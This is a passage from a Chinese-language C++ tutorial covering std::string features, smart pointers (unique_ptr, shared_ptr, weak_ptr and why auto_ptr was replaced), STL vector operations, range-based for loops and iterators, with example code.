返回一个指向以空字符结尾的 const char* 数组的指针，内容与 string 对象相同。返回的指针指向的内存在 string 对象被修改或销毁后可能失效。 data(): 类似 c_str()，但在 C++11 之前不保证以空字符结尾（C++11 起保证结尾有 \\0）。 当你需要将 string 对象传递给需要 const char* 的 C 风格函数时，这两个方法非常有用。 12345678#include &lt;string&gt;#include &lt;cstdio&gt; // for printfint main() &#123; std::string cpp_str = &quot;C++ String&quot;; printf(&quot;Using c_str(): %s\\n&quot;, cpp_str.c_str()); return 0;&#125; 16.1.4 string 还提供了哪些功能std::string 类还有许多其他功能，包括： 容量管理: capacity(): 返回当前分配的内存容量（可能大于 size()）。 reserve(n): 请求至少为 n 的容量。如果 n 大于当前容量，可能重新分配内存。 shrink_to_fit() (C++11): 请求减少容量以匹配当前大小。 clear(): 清空字符串内容（size() 变为 0）。 empty(): 检查字符串是否为空（size() == 0）。 迭代器: 提供 begin(), end(), rbegin(), rend() 等迭代器，允许像遍历容器一样遍历字符串中的字符，可以配合 STL 算法使用。 子字符串: substr(pos, count): 返回一个新的 string 对象，包含从 pos 开始的 count 个字符的子串。 比较: compare() 方法提供比关系运算符更详细的比较选项。 数值转换 (C++11): &lt;string&gt; 头文件还包含 stoi, stol, stod, to_string 等函数，用于字符串和数值类型之间的转换。 要了解 string 类的所有功能，建议查阅 C++ 参考文档（如 cppreference.com）。 16.1.5 字符串种类std::string 是 std::basic_string&lt;char&gt; 的别名，用于处理基于 char 的窄字符字符串（通常是 ASCII 或 UTF-8 编码）。 C++ 标准库还提供了处理其他字符类型的 basic_string 特化版本： std::wstring: basic_string&lt;wchar_t&gt; 的别名，用于处理宽字符 (wchar_t) 字符串，常用于 Windows API 中的 Unicode。 std::u16string (C++11): basic_string&lt;char16_t&gt; 的别名，用于处理 UTF-16 编码的字符串。 std::u32string (C++11): basic_string&lt;char32_t&gt; 的别名，用于处理 UTF-32 编码的字符串。 这些宽字符串类具有与 std::string 类似的操作接口，但处理的字符类型不同。 12345678910111213141516#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::wstring wide_str = L&quot;Wide String Example&quot;; // L 前缀表示宽字符字面量 std::u16string utf16_str = u&quot;UTF-16 String&quot;; // u 前缀 std::u32string utf32_str = U&quot;UTF-32 String&quot;; // U 前缀 // std::wcout 用于输出宽字符串 std::wcout &lt;&lt; L&quot;Wide: &quot; &lt;&lt; wide_str &lt;&lt; std::endl; // 输出 UTF-16/32 字符串通常需要特定的库或转换 // std::cout &lt;&lt; utf16_str &lt;&lt; std::endl; // 可能无法正确显示 return 0;&#125; 选择哪种字符串类型取决于你的应用场景和需要处理的字符集。在现代 C++ 中，如果需要处理 Unicode，通常推荐使用 UTF-8 编码的 std::string，并配合相应的 Unicode 处理库。 16.2 智能指针模板类在 C++ 中，使用 new 分配动态内存后，必须使用 delete 来释放它，否则会导致**内存泄漏 (Memory Leak)**。手动管理内存容易出错，尤其是在复杂的代码路径、异常处理或资源共享的情况下。忘记 delete、重复 delete 或使用悬挂指针（指向已释放内存的指针）都是常见的错误来源。 为了解决这个问题，C++ 标准库（在 &lt;memory&gt; 头文件中）提供了一系列智能指针 (Smart Pointers) 模板类。智能指针是行为类似于指针的类对象，但它们能自动管理所指向的动态分配的内存。当智能指针本身离开作用域（例如函数结束、对象销毁）或被重新赋值时，它会自动调用 delete（或自定义的删除器）来释放其管理的内存。这极大地简化了动态内存管理，提高了程序的健壮性，并有助于实现 RAII（资源获取即初始化）。 C++11 引入了三种主要的智能指针类型： std::unique_ptr&lt;T&gt;: 实现独占所有权 (Exclusive Ownership) 或严格所有权模型。在任何时候，只有一个 unique_ptr 可以指向给定的资源。当 unique_ptr 被销毁或重置时，资源被释放。它不能被复制，但可以被**移动 (Moved)**。 std::shared_ptr&lt;T&gt;: 实现共享所有权 (Shared Ownership) 模型。允许多个 shared_ptr 指向同一个资源。内部维护一个**引用计数 (Reference Count)**，记录有多少个 shared_ptr 指向该资源。只有当最后一个指向资源的 shared_ptr 被销毁或重置时，资源才会被释放。 std::weak_ptr&lt;T&gt;: 是一种非拥有 (Non-owning) 的智能指针，它指向由 shared_ptr 管理的资源，但不增加引用计数。它主要用于解决 shared_ptr 可能遇到的循环引用 (Cyclic Reference) 问题，并用于观察资源是否存在。 16.2.1 使用智能指针std::unique_ptrunique_ptr 是轻量级的智能指针，开销几乎与原始指针相同。它是管理动态分配资源的首选方式，除非你需要共享所有权。 创建: 推荐方式 (C++14 及以后): 使用 std::make_unique&lt;T&gt;(args...)。它更安全（避免了某些异常安全问题）且可能更高效。 12345678#include &lt;memory&gt;#include &lt;string&gt;// 创建指向 int 的 unique_ptrauto uptr_int = std::make_unique&lt;int&gt;(10); // 指向值为 10 的 int// 创建指向 string 的 unique_ptrauto uptr_str = std::make_unique&lt;std::string&gt;(&quot;Hello&quot;); // 指向 &quot;Hello&quot; C++11 方式: 直接使用 new。 12std::unique_ptr&lt;int&gt; uptr_int_cpp11(new int(20));std::unique_ptr&lt;std::string&gt; uptr_str_cpp11(new std::string(&quot;World&quot;)); 所有权转移 (移动): unique_ptr 不能复制，但可以通过 std::move() 转移所有权。 1234567891011std::unique_ptr&lt;int&gt; ptr1 = std::make_unique&lt;int&gt;(100);// std::unique_ptr&lt;int&gt; ptr2 = ptr1; // 错误！不能复制std::unique_ptr&lt;int&gt; ptr3 = std::move(ptr1); // OK！所有权从 ptr1 转移到 ptr3// 此时 ptr1 变为 nullptrif (!ptr1) &#123; std::cout &lt;&lt; &quot;ptr1 is now null.\\n&quot;;&#125;if (ptr3) &#123; std::cout &lt;&lt; &quot;ptr3 holds the value: &quot; &lt;&lt; *ptr3 &lt;&lt; std::endl; // 输出 100&#125; 函数可以返回 unique_ptr，这会自动触发移动语义，将所有权转移给调用者。 12345std::unique_ptr&lt;std::string&gt; create_string() &#123; return std::make_unique&lt;std::string&gt;(&quot;Created String&quot;);&#125;std::unique_ptr&lt;std::string&gt; owned_ptr = create_string(); // 所有权转移给 owned_ptr 使用: 像普通指针一样使用 * 和 -&gt;。 123std::unique_ptr&lt;std::string&gt; uptr = std::make_unique&lt;std::string&gt;(&quot;Test&quot;);std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; *uptr &lt;&lt; std::endl;std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; uptr-&gt;length() &lt;&lt; std::endl; 其他操作: get(): 返回指向被管理对象的原始指针（但不转移所有权）。小心使用，避免手动 delete 这个指针。 reset(p): 销毁当前管理的对象（如果有），并接管指针 p 指向的新对象。 reset(): 销毁当前管理的对象，并将 unique_ptr 置为空。 release(): 放弃对指针的所有权，返回原始指针，并将 unique_ptr 置为空。调用者负责手动 delete 返回的指针。 用于数组: unique_ptr 可以管理动态分配的数组。 1234567891011// 创建指向包含 5 个 int 的数组的 unique_ptrstd::unique_ptr&lt;int[]&gt; uptr_arr = std::make_unique&lt;int[]&gt;(5); // C++14// 或者 std::unique_ptr&lt;int[]&gt; uptr_arr_cpp11(new int[5]); // C++11// 使用 operator[] 访问元素for (int i = 0; i &lt; 5; ++i) &#123; uptr_arr[i] = i * 10; std::cout &lt;&lt; uptr_arr[i] &lt;&lt; &quot; &quot;;&#125;std::cout &lt;&lt; std::endl;// 离开作用域时，会自动调用 delete[] 自定义删除器: 可以为 unique_ptr 指定自定义的删除器，用于执行非标准的资源释放操作（如关闭文件句柄）。 1234567891011121314151617181920#include &lt;cstdio&gt; // for FILE, fopen, fclosestruct FileCloser &#123; void operator()(FILE* fp) const &#123; if (fp) &#123; std::fclose(fp); std::cout &lt;&lt; &quot;File closed.\\n&quot;; &#125; &#125;&#125;;int main() &#123; // 使用自定义删除器 FileCloser std::unique_ptr&lt;FILE, FileCloser&gt; file_ptr(std::fopen(&quot;test.txt&quot;, &quot;w&quot;)); if (file_ptr) &#123; std::fprintf(file_ptr.get(), &quot;Hello from unique_ptr with custom deleter.\\n&quot;); &#125; // 当 file_ptr 离开作用域时，FileCloser::operator() 会被调用以关闭文件 return 0;&#125; std::shared_ptrshared_ptr 用于资源可能被多个指针共享所有权的场景。 创建: 推荐方式: 使用 std::make_shared&lt;T&gt;(args...)。它通常更高效，因为它可以在一次内存分配中同时为对象和引用计数控制块分配内存。 12auto sptr_int = std::make_shared&lt;int&gt;(50);auto sptr_str = std::make_shared&lt;std::string&gt;(&quot;Shared&quot;); 使用 new: 12345std::shared_ptr&lt;int&gt; sptr_int_new(new int(60));// 注意：不要将同一个原始指针用于初始化多个 shared_ptr，应通过复制已有的 shared_ptr 来共享// int* raw_ptr = new int(70);// std::shared_ptr&lt;int&gt; sp1(raw_ptr);// std::shared_ptr&lt;int&gt; sp2(raw_ptr); // 错误！会导致重复 delete 共享所有权和引用计数: 复制 shared_ptr 会增加引用计数，销毁或重置 shared_ptr 会减少引用计数。 1234567891011std::shared_ptr&lt;int&gt; sp1 = std::make_shared&lt;int&gt;(100);std::cout &lt;&lt; &quot;sp1 use_count: &quot; &lt;&lt; sp1.use_count() &lt;&lt; std::endl; // 输出 1std::shared_ptr&lt;int&gt; sp2 = sp1; // 复制，引用计数增加std::cout &lt;&lt; &quot;sp1 use_count: &quot; &lt;&lt; sp1.use_count() &lt;&lt; std::endl; // 输出 2std::cout &lt;&lt; &quot;sp2 use_count: &quot; &lt;&lt; sp2.use_count() &lt;&lt; std::endl; // 输出 2sp1.reset(); // sp1 不再指向对象，引用计数减少std::cout &lt;&lt; &quot;sp1 reset. sp2 use_count: &quot; &lt;&lt; sp2.use_count() &lt;&lt; std::endl; // 输出 1// 当 sp2 离开作用域时，引用计数变为 0，对象被删除 使用: 与 unique_ptr 类似，使用 * 和 -&gt;。 其他操作: get(): 返回原始指针。 reset() / reset(p): 减少当前对象的引用计数（如果为 0 则删除），并可选地接管新指针 p。 use_count(): 返回当前的引用计数值（主要用于调试）。 循环引用问题: 如果两个对象通过 shared_ptr 相互引用，它们的引用计数永远不会变为 0，即使没有外部指针指向它们，也会导致内存泄漏。 12345678910111213141516171819202122232425struct NodeB; // 前向声明struct NodeA &#123; std::shared_ptr&lt;NodeB&gt; ptrB; ~NodeA() &#123; std::cout &lt;&lt; &quot;NodeA destroyed\\n&quot;; &#125;&#125;;struct NodeB &#123; std::shared_ptr&lt;NodeA&gt; ptrA; ~NodeB() &#123; std::cout &lt;&lt; &quot;NodeB destroyed\\n&quot;; &#125;&#125;;int main() &#123; std::shared_ptr&lt;NodeA&gt; pa = std::make_shared&lt;NodeA&gt;(); std::shared_ptr&lt;NodeB&gt; pb = std::make_shared&lt;NodeB&gt;(); pa-&gt;ptrB = pb; // pa 指向 pb pb-&gt;ptrA = pa; // pb 指向 pa (形成循环引用) std::cout &lt;&lt; &quot;pa use_count: &quot; &lt;&lt; pa.use_count() &lt;&lt; std::endl; // 输出 2 (pa 和 pb-&gt;ptrA) std::cout &lt;&lt; &quot;pb use_count: &quot; &lt;&lt; pb.use_count() &lt;&lt; std::endl; // 输出 2 (pb 和 pa-&gt;ptrB) // 当 pa 和 pb 离开作用域时，引用计数都只减到 1，析构函数不会被调用，内存泄漏！ return 0;&#125; 解决方案: 使用 std::weak_ptr 打破循环。 std::weak_ptrweak_ptr 用于“观察”由 shared_ptr 管理的对象，但它本身不拥有对象，也不影响对象的生命周期（不改变引用计数）。 创建: 只能从 shared_ptr 或另一个 weak_ptr 创建。 12345std::shared_ptr&lt;int&gt; sp = std::make_shared&lt;int&gt;(10);std::weak_ptr&lt;int&gt; wp = sp; // wp 观察 sp 管理的对象std::cout &lt;&lt; &quot;sp use_count: &quot; &lt;&lt; sp.use_count() &lt;&lt; std::endl; // 输出 1std::cout &lt;&lt; &quot;wp use_count: &quot; &lt;&lt; wp.use_count() &lt;&lt; std::endl; // 输出 1 (weak_ptr::use_count 返回的是 shared_ptr 的计数) 使用: expired(): 检查所观察的对象是否已被销毁（对应的 shared_ptr 引用计数是否为 0）。 lock(): 关键方法。尝试获取一个指向所观察对象的 shared_ptr。 如果对象仍然存在，返回一个有效的 shared_ptr（并增加引用计数）。 如果对象已被销毁，返回一个空的 shared_ptr。这是访问 weak_ptr 指向对象的安全方式。 1234567891011121314151617181920if (wp.expired()) &#123; std::cout &lt;&lt; &quot;Object observed by wp is expired.\\n&quot;;&#125; else &#123; std::shared_ptr&lt;int&gt; locked_sp = wp.lock(); // 尝试获取 shared_ptr if (locked_sp) &#123; // 检查是否成功获取 std::cout &lt;&lt; &quot;Object still alive. Value: &quot; &lt;&lt; *locked_sp &lt;&lt; std::endl; std::cout &lt;&lt; &quot;use_count after lock: &quot; &lt;&lt; locked_sp.use_count() &lt;&lt; std::endl; // 引用计数增加 &#125; else &#123; std::cout &lt;&lt; &quot;Object expired between check and lock.\\n&quot;; // 可能发生 (多线程) &#125; // locked_sp 离开作用域，引用计数减少&#125;sp.reset(); // 原始 shared_ptr 释放对象std::cout &lt;&lt; &quot;Original shared_ptr reset.\\n&quot;;std::shared_ptr&lt;int&gt; locked_sp_after_reset = wp.lock();if (!locked_sp_after_reset) &#123; std::cout &lt;&lt; &quot;weak_ptr lock() failed after object destruction.\\n&quot;;&#125; 解决循环引用: 在循环引用的场景中，让其中一个指针（或两个）成为 weak_ptr。 12345678910111213141516171819202122232425struct NodeB_weak;struct NodeA_weak &#123; std::shared_ptr&lt;NodeB_weak&gt; ptrB; // NodeA 强引用 NodeB ~NodeA_weak() &#123; std::cout &lt;&lt; &quot;NodeA_weak destroyed\\n&quot;; &#125;&#125;;struct NodeB_weak &#123; std::weak_ptr&lt;NodeA_weak&gt; ptrA; // NodeB 弱引用 NodeA (打破循环) ~NodeB_weak() &#123; std::cout &lt;&lt; &quot;NodeB_weak destroyed\\n&quot;; &#125;&#125;;int main() &#123; std::shared_ptr&lt;NodeA_weak&gt; pa = std::make_shared&lt;NodeA_weak&gt;(); std::shared_ptr&lt;NodeB_weak&gt; pb = std::make_shared&lt;NodeB_weak&gt;(); pa-&gt;ptrB = pb; pb-&gt;ptrA = pa; // pa 赋值给 weak_ptr，不增加 pa 的引用计数 std::cout &lt;&lt; &quot;pa use_count: &quot; &lt;&lt; pa.use_count() &lt;&lt; std::endl; // 输出 1 std::cout &lt;&lt; &quot;pb use_count: &quot; &lt;&lt; pb.use_count() &lt;&lt; std::endl; // 输出 1 // 当 pa 和 pb 离开作用域时，引用计数都能降为 0，对象被正确销毁 return 0; // 输出 NodeA_weak destroyed 和 NodeB_weak destroyed&#125; 16.2.2 有关智能指针的注意事项 不要混用智能指针和原始指针: 避免将 get() 返回的原始指针传递给另一个智能指针或手动 delete。 优先使用 make_unique 和 make_shared: 更安全、可能更高效。 shared_ptr 的性能开销: 引用计数是原子操作，在多线程环境下有一定开销。shared_ptr 对象本身也比 unique_ptr 或原始指针大（需要存储指向控制块的指针）。 this 指针问题: 不要在类的构造函数中将 this 指针直接传递给 shared_ptr 的构造函数。如果需要让类自身能够创建指向自己的 shared_ptr，应继承自 std::enable_shared_from_this&lt;YourClass&gt; 并使用 shared_from_this() 方法。 16.2.3 unique_ptr 为何优于 auto_ptrC++98 引入了 std::auto_ptr，它是 unique_ptr 的前身，也试图实现独占所有权。但 auto_ptr 有一个严重的设计缺陷：它的复制构造函数和赋值运算符会转移所有权。 12std::auto_ptr&lt;int&gt; ap1(new int(10));std::auto_ptr&lt;int&gt; ap2 = ap1; // ！！所有权从 ap1 转移到 ap2，ap1 变为无效！！ 这种隐式的、破坏性的复制行为非常危险，尤其是在将 auto_ptr 放入容器或作为函数参数按值传递时，会导致意外的所有权丢失。 C++11 引入了移动语义，使得 unique_ptr 可以通过显式的 std::move 来安全地转移所有权，同时禁止了复制操作，从而避免了 auto_ptr 的问题。 auto_ptr 已在 C++11 中被废弃，并在 C++17 中被移除。应始终使用 unique_ptr 替代它。 16.2.4 选择智能指针 默认选择 std::unique_ptr: 当你需要管理一个动态分配的资源，并且不需要共享其所有权时，unique_ptr 是最简单、最高效的选择。 使用 std::shared_ptr: 当资源需要被多个所有者共享生命周期时（例如，在数据结构中多个部分可能引用同一个节点，或者回调函数需要确保某个对象在其执行期间存活）。 使用 std::weak_ptr: 当你需要观察一个由 shared_ptr 管理的对象，但不想影响其生命周期时，特别是为了打破 shared_ptr 之间的循环引用。 智能指针是现代 C++ 中管理动态资源的核心工具，极大地提高了代码的安全性和简洁性。 16.3 标准模板库（STL）标准模板库 (Standard Template Library, STL) 是 C++ 标准库的一个重要组成部分，它提供了一套通用的模板类和函数，用于实现常用的数据结构和算法。STL 的核心思想是**泛型编程 (Generic Programming)**，即代码独立于特定的数据类型，可以应用于多种类型。 STL 主要由三个核心组件构成： 容器 (Containers): 用于存储数据的模板类。例如 vector, list, deque, set, map 等。它们封装了数据结构，并提供了管理元素的方法。 算法 (Algorithms): 用于处理容器中数据的模板函数。例如 sort, find, copy, for_each 等。这些算法通常通过迭代器作用于容器中的元素范围。 迭代器 (Iterators): 行为类似于指针的对象，用于遍历容器中的元素，并作为连接容器和算法的桥梁。 本节将重点介绍 STL 中最常用的容器之一：vector，以及适用于多种容器的通用操作。 16.3.1 模板类 vectorstd::vector 是一个模板类，定义在 &lt;vector&gt; 头文件中。它实现了一个**动态数组 (Dynamic Array)**，可以根据需要自动增长或收缩大小。 特点: 动态大小: 可以在运行时添加或删除元素，vector 会自动管理内存。 随机访问: 支持通过索引 ([] 或 at()) 快速访问任何位置的元素，时间复杂度为 O(1)。 连续存储: 元素在内存中是连续存储的，这使得通过指针或迭代器进行遍历非常高效，并能与需要连续内存的 C 风格 API 兼容。 尾部插入/删除高效: 在末尾添加 (push_back) 或删除 (pop_back) 元素通常很高效（摊销时间复杂度为 O(1)）。 中间插入/删除低效: 在中间或开头插入或删除元素可能需要移动后续所有元素，时间复杂度为 O(N)。 基本用法: 123456789101112131415161718192021222324252627282930#include &lt;vector&gt; // 包含 vector 头文件#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; // 创建 vector 对象 std::vector&lt;int&gt; scores; // 创建一个空的 int 向量 std::vector&lt;double&gt; lengths(10); // 创建包含 10 个 double 元素的向量，默认初始化为 0.0 std::vector&lt;std::string&gt; names(5, &quot;Unknown&quot;); // 创建包含 5 个 string 元素，都初始化为 &quot;Unknown&quot; // 使用初始化列表 (C++11) std::vector&lt;int&gt; numbers = &#123;10, 20, 30, 40, 50&#125;; std::vector&lt;char&gt; vowels &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; // 添加元素到末尾 scores.push_back(95); scores.push_back(88); scores.push_back(76); // scores 现在是 &#123;95, 88, 76&#125; // 访问元素 std::cout &lt;&lt; &quot;First score: &quot; &lt;&lt; scores[0] &lt;&lt; std::endl; // 使用 [] std::cout &lt;&lt; &quot;Second score: &quot; &lt;&lt; scores.at(1) &lt;&lt; std::endl; // 使用 at() (带边界检查) scores[0] = 98; // 修改元素 // 获取大小 std::cout &lt;&lt; &quot;Number of scores: &quot; &lt;&lt; scores.size() &lt;&lt; std::endl; // 输出 3 std::cout &lt;&lt; &quot;Number of names: &quot; &lt;&lt; names.size() &lt;&lt; std::endl; // 输出 5 return 0;&#125; 16.3.2 可对容器执行的操作许多 STL 容器（包括 vector）都支持一组常见的操作： size(): 返回容器中元素的数量。类型通常是 size_type (一种无符号整型)。 empty(): 检查容器是否为空。如果 size() == 0，返回 true，否则返回 false。 operator[]: 通过索引访问元素（仅适用于 vector, deque, string, array）。不进行边界检查。 at(): 通过索引访问元素（仅适用于 vector, deque, string, array）。进行边界检查，越界时抛出 std::out_of_range 异常。 front(): 返回对第一个元素的引用。容器不能为空。 back(): 返回对最后一个元素的引用。容器不能为空。 push_back(value): (仅适用于 vector, deque, list, string) 在容器末尾添加一个值为 value 的元素。 pop_back(): (仅适用于 vector, deque, list, string) 删除容器末尾的元素。容器不能为空。 示例: 123456789101112131415161718192021222324252627282930#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;stdexcept&gt; // for out_of_rangeint main() &#123; std::vector&lt;int&gt; data = &#123;1, 2, 3&#125;; if (!data.empty()) &#123; std::cout &lt;&lt; &quot;Size: &quot; &lt;&lt; data.size() &lt;&lt; std::endl; // 输出 3 std::cout &lt;&lt; &quot;Front: &quot; &lt;&lt; data.front() &lt;&lt; std::endl; // 输出 1 std::cout &lt;&lt; &quot;Back: &quot; &lt;&lt; data.back() &lt;&lt; std::endl; // 输出 3 std::cout &lt;&lt; &quot;Element at index 1: &quot; &lt;&lt; data[1] &lt;&lt; std::endl; // 输出 2 &#125; data.push_back(4); // data: &#123;1, 2, 3, 4&#125; std::cout &lt;&lt; &quot;After push_back(4), back is: &quot; &lt;&lt; data.back() &lt;&lt; std::endl; // 输出 4 data.pop_back(); // data: &#123;1, 2, 3&#125; std::cout &lt;&lt; &quot;After pop_back(), back is: &quot; &lt;&lt; data.back() &lt;&lt; std::endl; // 输出 3 try &#123; data.at(1) = 20; // 修改第二个元素 std::cout &lt;&lt; &quot;Element at index 1 (using at): &quot; &lt;&lt; data.at(1) &lt;&lt; std::endl; // 输出 20 int val = data.at(5); // 访问越界，将抛出异常 &#125; catch (const std::out_of_range&amp; oor) &#123; std::cerr &lt;&lt; &quot;Error: &quot; &lt;&lt; oor.what() &lt;&lt; std::endl; &#125; return 0;&#125; 16.3.3 对容器可执行的其他操作除了基本操作，STL 容器还提供了其他一些有用的方法，其中许多涉及到**迭代器 (Iterators)**。迭代器是泛化的指针，用于指定容器中的位置或范围。 迭代器获取: begin(): 返回指向容器第一个元素的迭代器。 end(): 返回指向容器末尾之后 (past-the-end) 位置的迭代器。它不指向任何有效元素，常用于标记范围的结束。 rbegin(), rend(): 返回反向迭代器，用于从后向前遍历。 cbegin(), cend(), crbegin(), crend() (C++11): 返回 const 迭代器，用于只读访问。 插入 (insert()): 在指定位置插入元素。需要一个指向插入位置的迭代器。 insert(iterator pos, const value_type&amp; val): 在 pos 之前插入 val。返回指向新插入元素的迭代器。 insert(iterator pos, size_type n, const value_type&amp; val): 在 pos 之前插入 n 个 val。 insert(iterator pos, InputIt first, InputIt last): 在 pos 之前插入来自迭代器范围 [first, last) 的元素。 删除 (erase()): 删除指定位置或范围的元素。需要迭代器。 erase(iterator pos): 删除 pos 指向的元素。返回指向被删除元素之后元素的迭代器。 erase(iterator first, iterator last): 删除范围 [first, last) 内的元素。返回指向最后一个被删除元素之后元素的迭代器。 清空 (clear()): 删除容器中的所有元素。size() 变为 0。 交换 (swap()): c1.swap(c2) 或 std::swap(c1, c2)。高效地交换两个容器的内容。对于 vector 等容器，通常只交换内部指针和大小信息，速度很快。 赋值 (assign()): 替换容器的全部内容。 assign(size_type n, const value_type&amp; val): 赋值为 n 个 val。 assign(InputIt first, InputIt last): 赋值为来自迭代器范围 [first, last) 的元素。 assign(initializer_list&lt;value_type&gt; il) (C++11): 从初始化列表赋值。 容量管理 (主要用于 vector, string, deque): capacity(): 返回当前已分配内存能够容纳的元素数量。 reserve(n): 请求将容量增加到至少 n。如果 n 大于当前容量，可能发生内存重新分配（这会导致所有迭代器、指针和引用失效）。 shrink_to_fit() (C++11): 请求减少容量以匹配 size()。不保证一定减少。 示例 (使用迭代器): 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;list&gt;int main() &#123; std::vector&lt;int&gt; v = &#123;10, 20, 30, 40, 50&#125;; // 获取迭代器 std::vector&lt;int&gt;::iterator it = v.begin(); // 指向 10 it += 2; // 移动迭代器，指向 30 (vector 支持随机访问迭代器) // 插入 v.insert(it, 25); // 在 30 之前插入 25。v: &#123;10, 20, 25, 30, 40, 50&#125; // 注意：vector 插入可能导致迭代器失效，最好重新获取或使用返回的迭代器 std::cout &lt;&lt; &quot;After insert: &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // 删除 it = v.begin() + 1; // 指向 20 v.erase(it); // 删除 20。v: &#123;10, 25, 30, 40, 50&#125; std::cout &lt;&lt; &quot;After erase(it): &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; it = v.begin() + 1; // 指向 25 std::vector&lt;int&gt;::iterator it_end = v.begin() + 3; // 指向 40 (范围是 [it, it_end) ) v.erase(it, it_end); // 删除 25, 30。v: &#123;10, 40, 50&#125; std::cout &lt;&lt; &quot;After erase(range): &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // 使用 assign std::list&lt;int&gt; l = &#123;100, 200, 300&#125;; v.assign(l.begin(), l.end()); // 用 list 的内容替换 vector 内容。v: &#123;100, 200, 300&#125; std::cout &lt;&lt; &quot;After assign: &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; v.clear(); // 清空 vector std::cout &lt;&lt; &quot;After clear, size is: &quot; &lt;&lt; v.size() &lt;&lt; std::endl; // 输出 0 return 0;&#125; 16.3.4 基于范围的 for 循环（C++11）C++11 引入了一种更简洁、更不易出错的遍历容器（以及其他支持 begin() 和 end() 的序列）的方式：**基于范围的 for 循环 (Range-based for loop)**。 语法: 123for ( declaration : range_expression ) &#123; // loop_statement&#125; range_expression: 一个可以提供 begin() 和 end() 迭代器的对象（如 STL 容器、数组、初始化列表，或定义了相应成员/非成员函数的自定义类型）。 declaration: 声明一个变量，其类型应与 range_expression 中的元素类型兼容。每次循环迭代，range_expression 中的下一个元素会被复制或引用到这个变量中。 常用形式: 只读访问 (推荐): 使用 const auto&amp; 避免不必要的复制，并确保不会意外修改元素。 12345std::vector&lt;std::string&gt; names = &#123;&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;&#125;;for (const auto&amp; name : names) &#123; std::cout &lt;&lt; name &lt;&lt; &quot; &quot;;&#125;// 输出: Alice Bob Charlie 修改元素: 使用 auto&amp; 获取元素的引用，允许在循环中修改容器内容。 123456789std::vector&lt;int&gt; nums = &#123;1, 2, 3, 4&#125;;for (auto&amp; num : nums) &#123; num *= 2; // 将每个元素乘以 2&#125;// nums 现在是 &#123;2, 4, 6, 8&#125;for (const auto&amp; num : nums) &#123; std::cout &lt;&lt; num &lt;&lt; &quot; &quot;;&#125;// 输出: 2 4 6 8 复制元素: 使用 auto (或具体类型) 会将每个元素复制到循环变量中。对循环变量的修改不会影响容器中的原始元素。 12345678910std::vector&lt;int&gt; data = &#123;5, 10, 15&#125;;for (auto val : data) &#123; val += 1; // 只修改了副本 val，data 不变 std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; // 输出 6 11 16&#125;std::cout &lt;&lt; std::endl;for (const auto&amp; d : data) &#123; std::cout &lt;&lt; d &lt;&lt; &quot; &quot;; // 输出 5 10 15 (原始数据未变)&#125;std::cout &lt;&lt; std::endl; 基于范围的 for 循环极大地简化了遍历容器的代码，使其更易读、更安全（避免了迭代器失效或索引越界等常见错误）。 16.4 泛型编程泛型编程 (Generic Programming) 是一种编程范式，旨在编写独立于特定数据类型的代码。其目标是创建可重用的组件（如函数或类），这些组件可以处理多种不同的数据类型，而无需为每种类型重写代码。C++ 中的模板 (Templates) 是实现泛型编程的主要机制。 标准模板库 (STL) 就是泛型编程思想的集中体现。它通过模板定义了通用的容器、算法和迭代器，使得我们可以用同样的方式操作 vector&lt;int&gt;, list&lt;string&gt; 或其他自定义类型的数据。 16.4.1 为何使用迭代器STL 的设计核心是将数据存储（容器）和数据操作（算法）分离开来。但是，算法如何才能访问不同容器（如 vector, list, deque）中的数据呢？不同的容器内部结构可能完全不同。 迭代器 (Iterators) 就是解决这个问题的关键。迭代器是一种泛化的指针，它提供了一种统一的方式来遍历容器中的元素，并访问元素的值，而无需暴露容器的内部实现细节。 抽象访问: 算法不直接操作容器，而是通过迭代器来访问容器中的元素范围。 统一接口: 所有容器都提供符合特定标准的迭代器接口（如 begin(), end(), ++ 前进, * 解引用）。 灵活性: 算法只需要知道如何使用迭代器，就可以应用于任何提供兼容迭代器的容器。例如，std::sort 算法可以对 vector, deque 甚至普通数组（通过指针，指针也是一种迭代器）进行排序，只要它们提供所需的迭代器类型。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include &lt;list&gt;#include &lt;algorithm&gt; // for std::find#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; vec = &#123;1, 2, 3, 4, 5&#125;; std::list&lt;int&gt; lst = &#123;10, 20, 30, 40, 50&#125;; int arr[] = &#123;100, 200, 300, 400, 500&#125;; int value_to_find = 3; int value_to_find_list = 30; int value_to_find_arr = 300; // 使用 std::find 算法，通过迭代器操作不同容器 auto it_vec = std::find(vec.begin(), vec.end(), value_to_find); if (it_vec != vec.end()) &#123; std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; value_to_find &lt;&lt; &quot; in vector.\\n&quot;; &#125; auto it_lst = std::find(lst.begin(), lst.end(), value_to_find_list); if (it_lst != lst.end()) &#123; std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; value_to_find_list &lt;&lt; &quot; in list.\\n&quot;; &#125; // 普通指针也可以作为迭代器使用 int* it_arr = std::find(arr, arr + 5, value_to_find_arr); if (it_arr != arr + 5) &#123; std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; value_to_find_arr &lt;&lt; &quot; in array.\\n&quot;; &#125; return 0;&#125; 在这个例子中，同一个 std::find 算法可以作用于 vector, list 和 C 风格数组，因为它操作的是迭代器（或指针）定义的范围，而不是容器本身。 16.4.2 迭代器类型STL 定义了五种主要的迭代器类别，它们根据提供的操作能力进行区分： 输入迭代器 (Input Iterator): 最基本的迭代器，只能向前移动 (++)。 只能读取 (*) 所指向的元素一次（读取后再次读取同一位置的结果未定义）。 支持比较相等 (==, !=)。 用于单遍扫描算法，例如 